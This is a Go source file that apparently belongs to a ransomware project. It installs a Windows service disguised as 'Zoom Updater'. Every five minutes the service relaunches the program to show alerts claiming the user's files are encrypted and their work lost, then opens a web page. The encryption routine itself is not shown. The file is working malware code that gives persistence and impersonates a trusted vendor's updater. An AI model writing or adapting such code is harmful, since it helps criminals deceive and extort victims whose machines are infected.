package main

import (
    "os"
    "time"
    "runtime"

    "github.com/kernullist/gowinsvc"
    "github.com/sug0/sr-ransomware/go/win"
)

const cryptoArg = "winmain"

type service struct {
    self *gowinsvc.ServiceObject
}

func main() {
    if len(os.Args) > 1 && os.Args[1] == cryptoArg {
        cryptoMain()
        return
    }
    serviceMain()
}

func cryptoMain() {
    win.MessageBox(
        "Ooopsies!!!!!!!",
        "Looks like your files have been encrypted!",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.MessageBox(
        "Alright, so what?",
        "All your important work has been lost.",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.ShellExecute("open", "https://example.org", win.SW_SHOW)
}

func serviceMain() {
    runtime.LockOSThread()
    s := service{
        self: gowinsvc.NewService("Zoom Updater"),
    }
    s.self.StartServe(&s)
}

func (s *service) Serve(exit <-chan bool) {
    p := os.Args[0] + (" " + cryptoArg)
    err := win.LaunchProcess(p)
    if err != nil {
        s.self.OutputDebugString("[Zoom Updater] error: %s", err)
    }
    for {
        select {
        case <-exit:
            return
        case <-time.After(5 * time.Minute):
            err = win.LaunchProcess(p)
            if err != nil {
                s.self.OutputDebugString("[Zoom Updater] error: %s", err)
            }
        }
    }
}
